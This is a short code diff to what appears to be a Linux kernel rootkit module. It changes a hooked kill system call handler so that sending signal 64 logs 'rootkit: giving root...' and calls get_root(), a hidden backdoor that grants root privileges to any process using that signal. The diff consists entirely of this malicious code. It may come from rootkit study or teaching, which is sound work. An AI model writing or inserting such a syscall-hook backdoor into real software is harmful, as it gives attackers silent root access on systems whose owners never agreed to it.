@@ -429,8 +429,11 @@ asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     pid_t pid = regs->di;
     int sig = regs->si;
-    if (pid == 6666)
-        pr_info("%d", sig);
+    if (sig == 64)
+    {
+        printk(KERN_INFO "rootkit: giving root...\n");
+        get_root();
+    }
     return orig_kill(regs);
 }
 
